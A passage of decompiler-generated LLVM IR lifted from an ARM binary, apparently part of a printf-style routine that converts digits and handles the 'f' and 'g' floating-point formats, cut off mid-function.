  store i1 %v5_16f9c, i1* %cpsr_v.global-to-local, align 1
  %v6_16f9c = icmp slt i32 %v1_16f9c, 0
  store i1 %v6_16f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_16f9c = icmp eq i32 %v1_16fc0, 16
  store i1 %v7_16f9c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_16fa8 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_16fa8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_16fb0 = xor i1 %v6_16f9c, %v5_16f9c
  %v4_16fb0 = or i1 %v7_16f9c, %v3_16fb0
  br i1 %v4_16fb0, label %dec_label_pc_16fbc, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_16f98
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_16fb4152 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_16fb4152, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_16f98
  %v2_16fbc = ptrtoint i32* %stack_var_-78 to i32
  %v2_16fc0 = add i32 %v1_16fc0, %v2_16fbc
  store i32 %v2_16fc0, i32* %r3.global-to-local, align 4
  %v1_16fc4 = add i32 %v2_16fc0, 2
  %v2_16fc4 = inttoptr i32 %v1_16fc4 to i8*
  %v3_16fc4 = load i8, i8* %v2_16fc4, align 1
  %v4_16fc4 = zext i8 %v3_16fc4 to i32
  store i32 %v4_16fc4, i32* %r2.global-to-local, align 4
  store i32 %v1_16fc4, i32* %r1.global-to-local, align 4
  %v2_16fcc = icmp ugt i8 %v3_16fc4, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16fcc = icmp ult i8 %v3_16fc4, 52
  store i1 %v6_16fcc, i1* %cpsr_n.global-to-local, align 1
  %v7_16fcc = icmp eq i8 %v3_16fc4, 52
  store i1 %v7_16fcc, i1* %cpsr_z.global-to-local, align 1
  %v2_16fd0 = xor i1 %v2_16fcc, true
  %v3_16fd0 = or i1 %v7_16fcc, %v2_16fd0
  br i1 %v3_16fd0, label %bb237, label %bb238

bb237:                                            ; preds = %dec_label_pc_16fbc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb238

bb238:                                            ; preds = %dec_label_pc_16fbc, %bb237
  %v1_16fdc86 = phi i32 [ %v1_16fdc88, %dec_label_pc_16fbc ], [ 0, %bb237 ]
  %v2_16fd4 = xor i1 %v7_16fcc, true
  %v3_16fd4 = and i1 %v2_16fcc, %v2_16fd4
  br i1 %v3_16fd4, label %bb239, label %.preheader

bb239:                                            ; preds = %bb238
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb238, %bb239, %..preheader_crit_edge, %.backedge
  %v1_16fdc = phi i32 [ %v1_16fdc.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_16fdc86, %bb238 ], [ 1, %bb239 ]
  %v0_16fd8 = phi i32 [ %v0_16fe4, %.backedge ], [ %v7_16fb4152, %..preheader_crit_edge ], [ %v1_16fc4, %bb238 ], [ %v1_16fc4, %bb239 ]
  %v1_16fd8 = add i32 %v0_16fd8, -1
  %v2_16fd8 = inttoptr i32 %v1_16fd8 to i8*
  %v3_16fd8 = load i8, i8* %v2_16fd8, align 1
  %v4_16fd8 = zext i8 %v3_16fd8 to i32
  store i32 %v1_16fd8, i32* %r1.global-to-local, align 4
  %v2_16fdc = add i32 %v4_16fd8, %v1_16fdc
  store i32 %v2_16fdc, i32* %r3.global-to-local, align 4
  %v1_16fe0 = trunc i32 %v2_16fdc to i8
  store i8 %v1_16fe0, i8* %v2_16fd8, align 1
  %v0_16fe4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fe4 = inttoptr i32 %v0_16fe4 to i8*
  %v2_16fe4 = load i8, i8* %v1_16fe4, align 1
  %v3_16fe4 = zext i8 %v2_16fe4 to i32
  store i32 %v3_16fe4, i32* %r2.global-to-local, align 4
  %v2_16fe8 = icmp ugt i8 %v2_16fe4, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16fe8 = icmp ult i8 %v2_16fe4, 57
  store i1 %v6_16fe8, i1* %cpsr_n.global-to-local, align 1
  %v7_16fe8 = icmp eq i8 %v2_16fe4, 57
  store i1 %v7_16fe8, i1* %cpsr_z.global-to-local, align 1
  %v2_16fec = xor i1 %v2_16fe8, true
  %v3_16fec = or i1 %v7_16fe8, %v2_16fec
  br i1 %v3_16fec, label %bb240, label %bb241

bb240:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb241

bb241:                                            ; preds = %.preheader, %bb240
  %v2_16ff0 = xor i1 %v7_16fe8, true
  %v3_16ff0 = and i1 %v2_16fe8, %v2_16ff0
  br i1 %v3_16ff0, label %bb242, label %._crit_edge

._crit_edge:                                      ; preds = %bb241
  %v1_16ff8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb243

bb242:                                            ; preds = %bb241
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb243

bb243:                                            ; preds = %._crit_edge, %bb242
  %v1_16ff8 = phi i32 [ %v1_16ff8.pre, %._crit_edge ], [ 1, %bb242 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16ff4 = icmp ult i8 %v2_16fe4, 48
  store i1 %v6_16ff4, i1* %cpsr_n.global-to-local, align 1
  %v7_16ff4 = icmp eq i8 %v2_16fe4, 48
  store i1 %v7_16ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16ff4, label %.thread17, label %bb244

.thread17:                                        ; preds = %bb243
  %v2_16ff8 = or i32 %v1_16ff8, 1
  store i32 %v2_16ff8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16ffc18 = icmp slt i32 %v2_16ff8, 0
  store i1 %v1_16ffc18, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb244:                                            ; preds = %bb243
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16ffc = icmp slt i32 %v1_16ff8, 0
  store i1 %v1_16ffc, i1* %cpsr_n.global-to-local, align 1
  %v2_16ffc = icmp eq i32 %v1_16ff8, 0
  store i1 %v2_16ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ffc, label %dec_label_pc_17004, label %.backedge

.backedge:                                        ; preds = %bb244, %.thread17
  %v1_16fdc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_17004:                               ; preds = %bb244
  store i32 %v2_16fa8, i32* %r2.global-to-local, align 4
  %v2_17008 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_17008, i32* %r3.global-to-local, align 4
  %v2_1700c = sub i32 %v0_16fe4, %v2_17008
  %v3_1700c = icmp uge i32 %v0_16fe4, %v2_17008
  %v4_1700c = xor i32 %v0_16fe4, %v2_17008
  %v5_1700c = xor i32 %v2_1700c, %v0_16fe4
  %v6_1700c = and i32 %v5_1700c, %v4_1700c
  %v7_1700c = icmp slt i32 %v6_1700c, 0
  store i1 %v7_1700c, i1* %cpsr_v.global-to-local, align 1
  %v8_1700c = icmp slt i32 %v2_1700c, 0
  store i1 %v8_1700c, i1* %cpsr_n.global-to-local, align 1
  %v9_1700c = icmp eq i32 %v0_16fe4, %v2_17008
  store i1 %v9_1700c, i1* %cpsr_z.global-to-local, align 1
  %v2_17010 = xor i1 %v3_1700c, true
  %v3_17010 = or i1 %v9_1700c, %v2_17010
  br i1 %v3_17010, label %bb245, label %.thread162

bb245:                                            ; preds = %dec_label_pc_17004
  store i32 %v2_17008, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_17008, i32* %r1.global-to-local, align 4
  br label %.thread162

.thread162:                                       ; preds = %dec_label_pc_17004, %bb245
  %v4_17020160 = phi i32 [ %stack_var_-192.7, %bb245 ], [ %v2_17008, %dec_label_pc_17004 ]
  %v2_17030 = phi i32 [ %v2_17008, %bb245 ], [ %v0_16fe4, %dec_label_pc_17004 ]
  %v4_17024154159 = phi i32 [ %v2_17008, %bb245 ], [ %v2_16fa8, %dec_label_pc_17004 ]
  %v2_1701c = xor i1 %v9_1700c, true
  %v3_1701c = and i1 %v3_1700c, %v2_1701c
  br i1 %v3_1701c, label %bb246, label %bb247

bb246:                                            ; preds = %.thread162
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb247

bb247:                                            ; preds = %.thread162, %bb246
  br i1 %v3_17010, label %bb248, label %bb249

bb248:                                            ; preds = %bb247
  %v5_17020 = add i32 %v4_17020160, 1
  store i32 %v5_17020, i32* %r0.global-to-local, align 4
  br label %bb249

bb249:                                            ; preds = %bb247, %bb248
  br i1 %v3_1701c, label %bb250, label %bb251

bb250:                                            ; preds = %bb249
  %v5_17024 = add i32 %v4_17024154159, 2
  store i32 %v5_17024, i32* %r2.global-to-local, align 4
  br label %bb251

bb251:                                            ; preds = %bb249, %bb250
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1702c = load i32, i32* %sl.global-to-local, align 4
  %v1_1702c = add i32 %v0_1702c, -103
  %v3_1702c = sub i32 102, %v0_1702c
  %v4_1702c = and i32 %v3_1702c, %v0_1702c
  %v5_1702c = icmp slt i32 %v4_1702c, 0
  store i1 %v5_1702c, i1* %cpsr_v.global-to-local, align 1
  %v6_1702c = icmp slt i32 %v1_1702c, 0
  store i1 %v6_1702c, i1* %cpsr_n.global-to-local, align 1
  %v7_1702c = icmp eq i32 %v0_1702c, 103
  store i1 %v7_1702c, i1* %cpsr_z.global-to-local, align 1
  %v3_17030 = add i32 %v2_17030, 1
  %v4_17030 = inttoptr i32 %v3_17030 to i8*
  store i8 0, i8* %v4_17030, align 1
  %v0_17034 = load i32, i32* %r1.global-to-local, align 4
  %v1_17034 = add i32 %v0_17034, 1
  store i32 %v1_17034, i32* %r1.global-to-local, align 4
  %v0_17038 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17038, label %dec_label_pc_1703c, label %dec_label_pc_1706c

dec_label_pc_1703c:                               ; preds = %bb251
  %v0_1703c = load i32, i32* %r0.global-to-local, align 4
  %v1_1703c = load i32, i32* %ip.global-to-local, align 4
  %v2_1703c = sub i32 %v0_1703c, %v1_1703c
  %v4_1703c = xor i32 %v1_1703c, %v0_1703c
  %v5_1703c = xor i32 %v2_1703c, %v0_1703c
  %v6_1703c = and i32 %v5_1703c, %v4_1703c
  %v7_1703c = icmp slt i32 %v6_1703c, 0
  %v8_1703c = icmp slt i32 %v2_1703c, 0
  %v9_1703c = icmp eq i32 %v0_1703c, %v1_1703c
  %v3_17040 = xor i1 %v8_1703c, %v7_1703c
  %v4_17040 = or i1 %v9_1703c, %v3_17040
  %.273 = zext i1 %v4_17040 to i32
  store i32 %.273, i32* %r3.global-to-local, align 4
  %v1_17048 = add i32 %v0_1703c, 4
  %v3_17048 = sub i32 0, %v0_1703c
  %v4_17048 = and i32 %v1_17048, %v3_17048
  %v5_17048 = icmp slt i32 %v4_17048, 0
  store i1 %v5_17048, i1* %cpsr_v.global-to-local, align 1
  %v6_17048 = icmp slt i32 %v1_17048, 0
  store i1 %v6_17048, i1* %cpsr_n.global-to-local, align 1
  %v7_17048 = icmp eq i32 %v1_17048, 0
  store i1 %v7_17048, i1* %cpsr_z.global-to-local, align 1
  %v2_1704c = xor i1 %v6_17048, %v5_17048
  br i1 %v2_1704c, label %.thread21, label %bb254

.thread21:                                        ; preds = %dec_label_pc_1703c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread165

bb254:                                            ; preds = %dec_label_pc_1703c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17050 = icmp eq i1 %v4_17040, false
  store i1 %v2_17050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17050, label %.thread165, label %bb255

.thread165:                                       ; preds = %bb254, %.thread21
  %v1_170583551 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_170583551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17078

bb255:                                            ; preds = %bb254
  %v3_17054 = sub i32 %v1_1703c, %v0_1703c
  store i32 %v3_17054, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17084

dec_label_pc_1706c:                               ; preds = %bb251
  %v0_1706c = load i32, i32* %sl.global-to-local, align 4
  %v1_1706c = add i32 %v0_1706c, -102
  %v3_1706c = sub i32 101, %v0_1706c
  %v4_1706c = and i32 %v3_1706c, %v0_1706c
  %v5_1706c = icmp slt i32 %v4_1706c, 0
  store i1 %v5_1706c, i1* %cpsr_v.global-to-local, align 1
  %v6_1706c = icmp slt i32 %v1_1706c, 0
  store i1 %v6_1706c, i1* %cpsr_n.global-to-local, align 1
  %v7_1706c = icmp eq i32 %v0_1706c, 102
  store i1 %v7_1706c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1706c, i32* %r7.global-to-local, align 4
  br i1 %v7_1706c, label %dec_label_pc_1706c.dec_label_pc_17084_crit_edge, label %dec_label_pc_17078

dec_label_pc_1706c.dec_label_pc_17084_crit_edge:  ; preds = %dec_label_pc_1706c
  %v0_17084.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17084

dec_label_pc_17078:                               ; preds = %.thread165, %dec_label_pc_1706c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17094

dec_label_pc_17084:                               ; preds = %bb255, %dec_label_pc_1706c.dec_label_pc_17084_crit_edge
  %v0_17084 = phi i32 [ %v0_1703c, %bb255 ], [ %v0_17084.pre, %dec_label_pc_1706c.dec_label_pc_17084_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_17054, %bb255 ], [ %v0_16f5c, %dec_label_pc_1706c.dec_label_pc_17084_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17084 = icmp slt i32 %v0_17084, 0
  store i1 %v1_17084, i1* %cpsr_n.global-to-local, align 1
  %v2_17084 = icmp eq i32 %v0_17084, 0
  store i1 %v2_17084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17084, label %bb256, label %bb257

bb256:                                            ; preds = %dec_label_pc_17084
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1708c = load i32, i32* %r2.global-to-local, align 4
  %v6_1708c = add i32 %v5_1708c, -1
  %v7_1708c = inttoptr i32 %v6_1708c to i8*
  store i8 48, i8* %v7_1708c, align 1
  %v8_1708c = load i32, i32* %r2.global-to-local, align 4
  %v9_1708c = add i32 %v8_1708c, -1
  store i32 %v9_1708c, i32* %r2.global-to-local, align 4
  %v0_17090.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_170c0.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_170c4.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_170c4.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb257

bb257:                                            ; preds = %dec_label_pc_17084, %bb256
  %v1_170c4.pre = phi i1 [ %v1_170c4.pre.pre, %bb256 ], [ false, %dec_label_pc_17084 ]
  %v0_170c4.pre = phi i1 [ %v0_170c4.pre.pre, %bb256 ], [ false, %dec_label_pc_17084 ]
  %v1_170c0.pre = phi i32 [ %v1_170c0.pre.pre, %bb256 ], [ %v1_17034, %dec_label_pc_17084 ]
  %v0_17090 = phi i32 [ %v0_17090.pre, %bb256 ], [ %v0_17084, %dec_label_pc_17084 ]
  store i32 %v0_17090, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17094

dec_label_pc_17094:                               ; preds = %dec_label_pc_17078, %bb257
  %v0_1712c = phi i32 [ 0, %dec_label_pc_17078 ], [ %v0_17090, %bb257 ]
  %v1_170c8 = phi i1 [ false, %dec_label_pc_17078 ], [ %v1_170c4.pre, %bb257 ]
  %v0_170c8 = phi i1 [ false, %dec_label_pc_17078 ], [ %v0_170c4.pre, %bb257 ]
  %v1_170c0 = phi i32 [ %v1_17034, %dec_label_pc_17078 ], [ %v1_170c0.pre, %bb257 ]
  %v1_171e8 = phi i32 [ %v0_16f5c, %dec_label_pc_17078 ], [ %stack_var_-184.3, %bb257 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_170a0 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_170a0, i32* %r3.global-to-local, align 4
  %v0_170ac = load i32, i32* %r2.global-to-local, align 4
  %v1_170ac = inttoptr i32 %v0_170ac to i8*
  %v2_170ac = load i8, i8* %v1_170ac, align 1
  %v3_170ac = zext i8 %v2_170ac to i32
  store i32 %v3_170ac, i32* %r3.global-to-local, align 4
  %v5_170ac = add i32 %v0_170ac, 1
  store i32 %v5_170ac, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_170ac, i32* %stack_var_-38, align 4
  %v2_170c0 = sub i32 %v1_170c0, %v5_170ac
  store i32 %v2_170c0, i32* %r1.global-to-local, align 4
  %v2_170c4 = xor i1 %v1_170c8, %v0_170c8
  br i1 %v2_170c4, label %.thread167, label %dec_label_pc_170cc

.thread167:                                       ; preds = %dec_label_pc_17094
  %v5_170c4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_170c4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1713c

dec_label_pc_170cc:                               ; preds = %dec_label_pc_17094
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_170d0 = sub i32 %v0_1712c, %v2_170c0
  %v4_170d0 = xor i32 %v2_170c0, %v0_1712c
  %v5_170d0 = xor i32 %v2_170d0, %v0_1712c
  %v6_170d0 = and i32 %v5_170d0, %v4_170d0
  %v7_170d0 = icmp slt i32 %v6_170d0, 0
  store i1 %v7_170d0, i1* %cpsr_v.global-to-local, align 1
  %v8_170d0 = icmp slt i32 %v2_170d0, 0
  store i1 %v8_170d0, i1* %cpsr_n.global-to-local, align 1
  %v9_170d0 = icmp eq i32 %v0_1712c, %v2_170c0
  store i1 %v9_170d0, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_170dc = xor i1 %v8_170d0, %v7_170d0
  br i1 %v2_170dc, label %dec_label_pc_17118, label %dec_label_pc_170e0

dec_label_pc_170e0:                               ; preds = %dec_label_pc_170cc
  store i32 %v2_170d0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_170d0, i1* %cpsr_n.global-to-local, align 1
  %v2_170e4 = icmp eq i32 %v2_170d0, 0
  store i1 %v2_170e4, i1* %cpsr_z.global-to-local, align 1
  %v2_170ec = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_170ec, i32* %lr.global-to-local, align 4
  %tmp258 = icmp slt i32 %v2_170d0, 1
  br i1 %tmp258, label %.thread169, label %dec_label_pc_170f8

.thread169:                                       ; preds = %dec_label_pc_170e0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17138

dec_label_pc_170f8:                               ; preds = %dec_label_pc_170e0
  store i32 ptrtoint (i32* @global_var_24e3b.1281 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_17104 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_17104, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1713c

dec_label_pc_17118:                               ; preds = %dec_label_pc_170cc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17118 = icmp slt i32 %v0_1712c, 0
  store i1 %v1_17118, i1* %cpsr_n.global-to-local, align 1
  %v2_17118 = icmp eq i32 %v0_1712c, 0
  store i1 %v2_17118, i1* %cpsr_z.global-to-local, align 1
  %v2_1711c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1711c, i32* %lr.global-to-local, align 4
  %tmp259 = icmp slt i32 %v0_1712c, 1
  br i1 %tmp259, label %dec_label_pc_17138, label %dec_label_pc_17128

dec_label_pc_17128:                               ; preds = %dec_label_pc_17118
  %v2_1712c = sub i32 %v2_170c0, %v0_1712c
  store i32 %v2_1712c, i32* %r1.global-to-local, align 4
  %v2_17130 = add i32 %v5_170ac, %v0_1712c
  store i32 %v2_17130, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17138

dec_label_pc_17138:                               ; preds = %dec_label_pc_17128, %.thread169, %dec_label_pc_17118
  %storemerge181.in = phi i32* [ %stack_var_-152, %dec_label_pc_17118 ], [ %stack_var_-140, %.thread169 ], [ %stack_var_-140, %dec_label_pc_17128 ]
  %v0_17150102 = phi i32 [ %v2_170c0, %dec_label_pc_17118 ], [ 0, %.thread169 ], [ %v2_1712c, %dec_label_pc_17128 ]
  %storemerge181 = ptrtoint i32* %storemerge181.in to i32
  store i32 %storemerge181, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1713c

dec_label_pc_1713c:                               ; preds = %.thread167, %dec_label_pc_170f8, %dec_label_pc_17138
  %v1_17174 = phi i32 [ %v2_17104, %dec_label_pc_170f8 ], [ %storemerge181, %dec_label_pc_17138 ], [ %v5_170c4, %.thread167 ]
  %v0_1718c110 = phi i32 [ -1, %dec_label_pc_170f8 ], [ -1, %dec_label_pc_17138 ], [ %v0_1712c, %.thread167 ]
  %v0_17150 = phi i32 [ 0, %dec_label_pc_170f8 ], [ %v0_17150102, %dec_label_pc_17138 ], [ %v2_170c0, %.thread167 ]
  %v2_1713c = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_1713c, i32* %r2.global-to-local, align 4
  %v1_17140 = add i32 %v2_1713c, 12
  %v2_17140 = inttoptr i32 %v1_17140 to i32*
  %v3_17140 = load i32, i32* %v2_17140, align 4
  %v1_17144 = and i32 %v3_17140, 16
  store i32 %v1_17144, i32* %lr.global-to-local, align 4
  %v2_17144 = icmp eq i32 %v1_17144, 0
  %tmp282 = zext i1 %v2_17144 to i32
  %.274 = xor i32 %tmp282, 1
  store i32 %.274, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17150 = icmp slt i32 %v0_17150, 0
  store i1 %v1_17150, i1* %cpsr_n.global-to-local, align 1
  %v2_17150 = icmp eq i32 %v0_17150, 0
  store i1 %v2_17150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17150, label %bb262, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_1713c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17170

bb262:                                            ; preds = %dec_label_pc_1713c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_17144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17144, label %dec_label_pc_17160, label %dec_label_pc_17170

dec_label_pc_17160:                               ; preds = %bb262
  store i32 %v1_171e8, i32* %r3.global-to-local, align 4
  %v0_17164 = load i32, i32* %sl.global-to-local, align 4
  %v1_17164 = add i32 %v0_17164, -103
  %v3_17164 = sub i32 102, %v0_17164
  %v4_17164 = and i32 %v3_17164, %v0_17164
  %v5_17164 = icmp slt i32 %v4_17164, 0
  store i1 %v5_17164, i1* %cpsr_v.global-to-local, align 1
  %v6_17164 = icmp slt i32 %v1_17164, 0
  store i1 %v6_17164, i1* %cpsr_n.global-to-local, align 1
  %v7_17164 = icmp eq i32 %v0_17164, 103
  store i1 %v7_17164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17164, label %dec_label_pc_1718c, label %bb263

bb263:                                            ; preds = %dec_label_pc_17160
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_17168 = icmp slt i32 %v1_171e8, 0
  store i1 %v2_17168, i1* %cpsr_n.global-to-local, align 1
  %v3_17168 = icmp eq i32 %v1_171e8, 0
  store i1 %v3_17168, i1* %cpsr_z.global-to-local, align 1
  %tmp264 = icmp slt i32 %v1_171e8, 1
  br i1 %tmp264, label %dec_label_pc_1718c, label %dec_label_pc_17170

dec_label_pc_17170:                               ; preds = %.thread40, %bb262, %bb263
  %v2_17174 = inttoptr i32 %v1_17174 to i32*
  store i32 112, i32* %v2_17174, align 4
  %v1_1717c = load i32, i32* %r6.global-to-local, align 4
  %v2_1717c = add i32 %v1_1717c, 4
  %v3_1717c = inttoptr i32 %v2_1717c to i32*
  store i32 1, i32* %v3_1717c, align 4
  store i32 ptrtoint (i32* @global_var_24e48.1283 to i32), i32* %r3.global-to-local, align 4
  %v1_17184 = load i32, i32* %r6.global-to-local, align 4
  %v2_17184 = add i32 %v1_17184, 8
  %v3_17184 = inttoptr i32 %v2_17184 to i32*
  store i32 ptrtoint (i32* @global_var_24e48.1283 to i32), i32* %v3_17184, align 4
  %v0_17188 = load i32, i32* %r6.global-to-local, align 4
  %v1_17188 = add i32 %v0_17188, 12
  store i32 %v1_17188, i32* %r6.global-to-local, align 4
  %v0_1718c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1718c

dec_label_pc_1718c:                               ; preds = %dec_label_pc_17160, %bb263, %dec_label_pc_17170
  %v1_17198 = phi i32 [ %v1_17174, %bb263 ], [ %v1_17188, %dec_label_pc_17170 ], [ %v1_17174, %dec_label_pc_17160 ]
  %v0_1718c = phi i32 [ %v0_1718c110, %bb263 ], [ %v0_1718c.pre, %dec_label_pc_17170 ], [ %v0_1718c110, %dec_label_pc_17160 ]
  %v1_1718c = add i32 %v0_1718c, 1
  store i32 %v1_1718c, i32* %ip.global-to-local, align 4
  %v3_1718c = sub i32 0, %v0_1718c
  %v4_1718c = and i32 %v1_1718c, %v3_1718c
  %v5_1718c = icmp slt i32 %v4_1718c, 0
  store i1 %v5_1718c, i1* %cpsr_v.global-to-local, align 1
  %v6_1718c = icmp slt i32 %v1_1718c, 0
  store i1 %v6_1718c, i1* %cpsr_n.global-to-local, align 1
  %v7_1718c = icmp eq i32 %v1_1718c, 0
  store i1 %v7_1718c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1718c, label %dec_label_pc_171b0, label %dec_label_pc_17194

dec_label_pc_17194:                               ; preds = %dec_label_pc_1718c
  %v1_17194 = sub i32 -1, %v0_1718c
  %v2_17198 = add i32 %v1_17198, 4
  %v3_17198 = inttoptr i32 %v2_17198 to i32*
  store i32 %v1_17194, i32* %v3_17198, align 4
  store i32 ptrtoint (i32* @global_var_24e3b.1281 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_171a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_171a4 = inttoptr i32 %v1_171a4 to i32*
  store i32 176, i32* %v2_171a4, align 4
  %v0_171a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_171a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_171a8 = add i32 %v1_171a8, 8
  %v3_171a8 = inttoptr i32 %v2_171a8 to i32*
  store i32 %v0_171a8, i32* %v3_171a8, align 4
  %v0_171ac = load i32, i32* %r6.global-to-local, align 4
  %v1_171ac = add i32 %v0_171ac, 12
  store i32 %v1_171ac, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_171b0

dec_label_pc_171b0:                               ; preds = %dec_label_pc_1718c, %dec_label_pc_17194
  %v2_171b8 = phi i32 [ %v1_17198, %dec_label_pc_1718c ], [ %v1_171ac, %dec_label_pc_17194 ]
  %v0_171b0 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_171b0 = icmp slt i32 %v0_171b0, 0
  store i1 %v1_171b0, i1* %cpsr_n.global-to-local, align 1
  %v2_171b0 = icmp eq i32 %v0_171b0, 0
  store i1 %v2_171b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_171b0, label %.thread49, label %bb265

bb265:                                            ; preds = %dec_label_pc_171b0
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_171b8 = inttoptr i32 %v2_171b8 to i32*
  store i32 112, i32* %v3_171b8, align 4
  %v1_171bc = load i32, i32* %r4.global-to-local, align 4
  %v2_171bc = load i32, i32* %r6.global-to-local, align 4
  %v3_171bc = add i32 %v2_171bc, 8
  %v4_171bc = inttoptr i32 %v3_171bc to i32*
  store i32 %v1_171bc, i32* %v4_171bc, align 4
  %v1_171c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_171c0 = load i32, i32* %r6.global-to-local, align 4
  %v3_171c0 = add i32 %v2_171c0, 4
  %v4_171c0 = inttoptr i32 %v3_171c0 to i32*
  store i32 %v1_171c0, i32* %v4_171c0, align 4
  %v1_171c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_171c4 = add i32 %v1_171c4, 12
  store i32 %v2_171c4, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_171b0, %bb265
